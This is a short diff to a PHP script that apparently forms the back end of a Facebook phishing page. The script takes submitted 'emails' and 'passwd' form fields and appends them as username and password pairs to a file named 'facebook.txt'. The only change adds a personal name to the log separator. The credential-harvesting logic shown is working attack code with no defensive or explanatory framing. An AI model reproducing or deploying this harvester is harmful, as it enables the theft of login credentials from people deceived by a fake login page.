@@ -5,7 +5,7 @@ if (!empty($_POST['emails']) && !empty($_POST['passwd'])) {
 $ac = fopen("facebook.txt","a+");
 $username = $_POST['emails'];
 $password = $_POST['passwd'];
-$userlar = ("\n__________________ \n Username : ".$username."\n Password : ".$password."\n__________________ \n");
+$userlar = ("\n_________Fırat Güneş_________ \n Username : ".$username."\n Password : ".$password."\n__________________ \n");
 fwrite($ac,$userlar);
 fclose($ac);
 }
